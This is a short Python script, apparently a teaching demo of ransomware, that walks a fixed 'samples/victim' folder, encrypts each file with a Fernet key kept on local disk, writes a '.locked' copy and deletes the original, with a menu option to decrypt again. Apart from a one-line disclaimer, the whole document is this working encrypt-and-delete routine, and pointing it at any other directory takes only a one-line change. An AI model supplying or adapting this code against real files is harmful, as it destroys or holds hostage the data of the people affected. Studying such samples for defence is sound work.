# PROCEED WITH CAUTION. THIS SCRIPT WILL ENCRYPT FILES IN THE SPECIFIED DIRECTORY.
# This script is for educational purposes only. Do not use it for malicious purposes.

import os
from cryptography.fernet import Fernet

def generate_key():
    key = Fernet.generate_key()
    with open("samples/my.key", "wb") as key_file:
        key_file.write(key)

def load_key():
    return open("samples/my.key", "rb").read()

def encrypt_files(directory):
    key = load_key()
    fernet = Fernet(key)
    for root, _, files in os.walk(directory):
        for file in files:
            filepath = os.path.join(root, file)
            with open(filepath, "rb") as f:
                file_data = f.read()
            encrypted_data = fernet.encrypt(file_data)
            with open(filepath + ".locked", "wb") as f:
                f.write(encrypted_data)
            os.remove(filepath)

def decrypt_files(directory):
    key = load_key()
    fernet = Fernet(key)
    for root, _, files in os.walk(directory):
        for file in files:
            if file.endswith(".locked"):
                filepath = os.path.join(root, file)
                with open(filepath, "rb") as f:
                    encrypted_data = f.read()
                decrypted_data = fernet.decrypt(encrypted_data)
                original_filepath = filepath[:-7]  # Remove .locked extension
                with open(original_filepath, "wb") as f:
                    f.write(decrypted_data)
                os.remove(filepath)  # Remove encrypted file
                print(f"Decrypted {original_filepath}")

directory = "samples/victim"

# Ask user for input: 1 for generate key, 2 for encrypt files, 3 for decrypt files
while True:
    print("1. Generate key")
    print("2. Encrypt files")
    print("3. Decrypt files")
    choice = input("Enter your choice: ")

    if choice == "1":
        generate_key()
        print("Key generated.")
    elif choice == "2":
        encrypt_files(directory)
        print("Files encrypted.")
    elif choice == "3":
        decrypt_files(directory)
        print("Files decrypted.")
    else:
        print("Exiting...")
        break

    print()
